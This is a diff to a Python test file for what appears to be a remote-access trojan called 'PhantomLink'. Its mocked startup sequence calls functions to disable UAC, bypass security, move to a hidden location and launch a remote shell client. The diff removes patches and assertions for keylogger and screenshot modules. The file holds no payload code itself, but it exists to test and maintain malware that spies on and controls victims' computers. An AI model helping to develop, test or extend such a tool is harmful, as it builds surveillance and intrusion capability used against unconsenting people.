@@ -66,15 +66,13 @@ class PhantomLinkDeepCoverageComprehensiveTests(unittest.TestCase):
     @patch("requests.post")
     def test_main_startup_sequence(self, mock_post, mock_sleep):
         with patch("ctypes.windll.shell32.IsUserAnAdmin", return_value=False), \
-                patch("client.PhantomLink.disable_uac"), \
-                patch("client.PhantomLink.update"), \
-                patch("client.PhantomLink.bypass_security"), \
-                patch("client.PhantomLink.move_to_hidden_location"), \
-                patch("client.PhantomLink.bypass_all_security"), \
-                patch("client.PhantomLink.KeyloggerModule.start") as mock_keylogger_start, \
-                patch("client.PhantomLink.ScreenshotModule.start") as mock_screenshot_start, \
-                patch("client.PhantomLink.ShellClient") as mock_client_cls:
-
+             patch("client.PhantomLink.disable_uac"), \
+             patch("client.PhantomLink.update"), \
+             patch("client.PhantomLink.bypass_security"), \
+             patch("client.PhantomLink.move_to_hidden_location"), \
+             patch("client.PhantomLink.bypass_all_security"), \
+             patch("client.PhantomLink.ShellClient") as mock_client_cls:
+            
             mock_client_inst = MagicMock()
             mock_client_cls.return_value = mock_client_inst
             mock_client_inst.run.side_effect = Exception("Stop main loop test")
@@ -84,10 +82,7 @@ class PhantomLinkDeepCoverageComprehensiveTests(unittest.TestCase):
                     pl.main()
                 except Exception:
                     pass
-
-            self.assertTrue(mock_client_inst.run.called)
-            mock_keylogger_start.assert_called_once_with()
-            mock_screenshot_start.assert_called_once_with()
+                self.assertTrue(mock_client_inst.run.called)
 
 
 if __name__ == "__main__":
